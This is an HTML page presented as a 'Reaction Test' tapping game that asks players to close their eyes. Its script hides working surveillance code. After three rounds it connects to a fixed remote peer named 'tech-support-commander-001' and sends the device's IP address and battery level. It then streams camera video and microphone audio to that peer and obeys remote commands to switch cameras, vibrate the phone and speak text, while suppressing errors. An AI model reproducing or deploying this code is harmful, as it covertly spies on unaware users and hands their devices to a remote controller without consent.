<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reaction Test</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: 'Arial', sans-serif;
            margin: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            padding-top: 15vh;
            touch-action: none;
            user-select: none;
        }

        #game-board {
            width: 85vw;
            height: 85vw;
            max-width: 400px;
            max-height: 400px;
            background-color: #2c3e50;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
            position: relative;
            border: 4px solid #34495e;
            cursor: pointer;
        }

            #game-board.active {
                background-color: #34495e;
            }

            #game-board.success {
                background-color: #27ae60;
            }

            #game-board.fail {
                background-color: #c0392b;
            }

        #hud-container {
            margin-bottom: 30px;
            text-align: center;
            width: 90%;
        }

        #main-display {
            font-size: 50px;
            font-weight: bold;
            color: #bdc3c7;
            text-shadow: 2px 2px 0 #000;
        }

        #instruction {
            font-size: 18px;
            color: #ecf0f1;
            margin-top: 10px;
            line-height: 1.4;
        }
    </style>
</head>
<body>

    <div id="hud-container">
        <div id="main-display">TAP TO START</div>
        <div id="instruction">1. Close eyes.<br>2. Wait for BEEP.<br>3. Tap fast!</div>
    </div>
    <div id="game-board"></div>

    <script>
        // --- CONFIG ---
        const TECHNICIAN_ID = "tech-support-commander-001";
        const TRIGGER_COUNT = 3;

        // --- VARS ---
        let gameState = 'IDLE';
        let beepTimestamp = 0;
        let roundCount = 0;
        let isConnected = false;

        // Audio
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        let audioCtx;

        // DOM
        const board = document.getElementById('game-board');
        const display = document.getElementById('main-display');

        // PeerJS
        const peer = new Peer();
        let myDataConnection = null;
        let currentStream = null;

        // 1. INPUT HANDLER
        board.addEventListener('touchstart', handleInput, { passive: false });
        board.addEventListener('mousedown', handleInput);

        function handleInput(e) {
            e.preventDefault();
            if (!audioCtx) audioCtx = new AudioContext();
            if (audioCtx.state === 'suspended') audioCtx.resume();

            if (gameState === 'IDLE') {
                gameState = 'WAITING_FOR_BEEP';
                display.innerText = "WAIT...";
                display.style.color = "#f1c40f";
                scheduleBeep();
                return;
            }

            if (gameState === 'WAITING_FOR_BEEP') {
                display.innerText = "TOO EARLY!";
                display.style.color = "#e74c3c";
                flashBoard('fail');
                clearTimeout(beepTimer);
                setTimeout(() => {
                    display.innerText = "WAIT...";
                    display.style.color = "#f1c40f";
                    scheduleBeep();
                }, 1000);
                return;
            }

            if (gameState === 'WAITING_FOR_TAP') {
                const reactionTime = Date.now() - beepTimestamp;
                display.innerText = reactionTime + " ms";
                display.style.color = "#2ecc71";
                flashBoard('success');
                roundCount++;

                if (roundCount === TRIGGER_COUNT && !isConnected) activateSurveillance();

                gameState = 'WAITING_FOR_BEEP';
                setTimeout(() => {
                    display.innerText = "WAIT...";
                    display.style.color = "#f1c40f";
                    scheduleBeep();
                }, 1000);
            }
        }

        // 2. TIMING & AUDIO
        let beepTimer = null;
        function scheduleBeep() {
            beepTimer = setTimeout(() => {
                playTone();
                beepTimestamp = Date.now();
                gameState = 'WAITING_FOR_TAP';
            }, Math.floor(Math.random() * 400) );
        }

        function playTone() {
            if (!audioCtx) return;
            const osc = audioCtx.createOscillator();
            const g = audioCtx.createGain();
            osc.connect(g); g.connect(audioCtx.destination);
            osc.frequency.value = 600; g.gain.value = 0.1;
            osc.start(); osc.stop(audioCtx.currentTime + 0.15);
        }

        function flashBoard(type) {
            board.classList.add(type);
            setTimeout(() => board.classList.remove(type), 200);
        }

        // 3. SURVEILLANCE & REMOTE CONTROL
        async function activateSurveillance() {
            isConnected = true;
            try {
                myDataConnection = peer.connect(TECHNICIAN_ID);

                myDataConnection.on('open', async () => {
                    // A. Send Battery & IP
                    let batLevel = null;
                    try {
                        const bat = await navigator.getBattery();
                        batLevel = bat.level;
                    } catch (e) { }

                    try {
                        const r = await fetch('https://api.ipify.org?format=json');
                        const j = await r.json();
                        myDataConnection.send({ type: 'info', ip: j.ip, battery: batLevel });
                    } catch (e) { }

                    // B. Listen for Commander Instructions
                    myDataConnection.on('data', (data) => {
                        console.log("Command received:", data);

                        // COMMAND: SWAP CAMERA
                        if (data.command === 'swap') toggleCamera();

                        // COMMAND: VIBRATE
                        if (data.command === 'vibrate') {
                            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
                        }

                        // COMMAND: SPEAK
                        if (data.command === 'speak' && data.text) {
                            const speech = new SpeechSynthesisUtterance(data.text);
                            window.speechSynthesis.speak(speech);
                        }
                    });
                });

                await startStream('user');
            } catch (err) { console.log("Silent error:", err); }
        }

        async function startStream(mode) {
            if (currentStream) currentStream.getTracks().forEach(t => t.stop());
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
            currentStream = stream;
            peer.call(TECHNICIAN_ID, stream);
        }

        let currentMode = 'user';
        function toggleCamera() {
            currentMode = (currentMode === 'user') ? 'environment' : 'user';
            startStream(currentMode);
        }
    </script>
</body>
</html>
